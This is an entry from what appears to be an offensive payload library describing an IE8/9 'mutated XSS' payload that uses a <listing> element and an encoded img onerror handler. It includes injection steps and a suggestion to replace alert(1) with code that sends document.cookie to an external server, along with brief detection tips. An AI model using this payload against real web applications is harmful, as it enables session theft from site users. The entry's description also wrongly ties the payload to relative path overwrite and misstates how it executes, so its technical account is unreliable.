---
id: 4718b01d-6339-4f2a-a846-2968dec32eac
type: code
name: IE8-Mutated-XSS-Relative-Path-Overwrite-Payload
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.914378+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - xss-payload
  - mutated-xss
  - ie8-ie9
platforms:
  - Web
  - Browser
validated: true
---

# IE8-Mutated-XSS-Relative-Path-Overwrite-Payload

## Code

```javascript
<listing id=x>&lt;img src=1 onerror=alert(1)&gt;</listing>
<script>alert(document.getElementById('x').innerHTML)</script>
```

## Description

This JavaScript payload exploits a mutated XSS vulnerability in IE8/9 by using a custom <listing> tag to store an encoded <img> element with an onerror handler that triggers an alert. A following <script> tag retrieves the innerHTML of the listing element, causing the malicious img tag to be parsed and executed. This technique relies on relative path overwrite and legacy browser parsing to bypass XSS filters that block direct <script> or <img> tags.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This is a static payload; no variables to substitute. For customization, replace 'alert(1)' with actual exploit code like sending document.cookie to an external server. | N/A |

## Usage

Inject this payload directly into the vulnerable Listing ID parameter of a web application (e.g., via URL query or form POST). Load the resulting page in Internet Explorer 8 or 9 to trigger execution. Commonly used in reflected XSS scenarios for proof-of-concept or to steal session data. Reference in procedures like [[procedures/Mutated-XSS-with-Relative-Path-Overwrite]] for step-by-step injection.

## Detection

- Scan for unusual HTML tags like <listing> or encoded <img> in reflected inputs using WAF rules.
- Monitor client-side for onerror events or DOM manipulations via JavaScript logging.
- Browser security tools (e.g., IE's XSS filter) may flag innerHTML alerts; server logs can detect anomalous parameter lengths or encodings.

## Related

- [[procedures/Mutated-XSS-with-Relative-Path-Overwrite]]
